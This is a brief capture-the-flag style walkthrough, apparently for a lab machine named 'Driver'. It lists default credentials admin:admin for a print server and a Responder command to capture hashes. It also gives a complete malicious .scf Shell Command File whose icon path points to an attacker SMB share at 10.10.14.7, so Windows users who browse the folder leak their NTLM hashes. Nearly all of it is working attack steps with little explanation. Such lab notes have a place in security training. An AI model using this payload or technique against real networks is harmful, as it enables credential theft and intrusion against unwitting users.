# Driver

1. Log into Print Server <admin:admin>

2. Startup SMB server
````
responder --lm -v -I tun0
````

3. Upload the malicious file to coordinate the target connecting back with SMB credentials
steal-hash.scf
`````     
[Shell]
Command=2
IconFile=\\10.10.14.7\share\pentestlab.ico
 
[Taskbar]
Command=ToggleDesktop
````





[Shell Command File](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
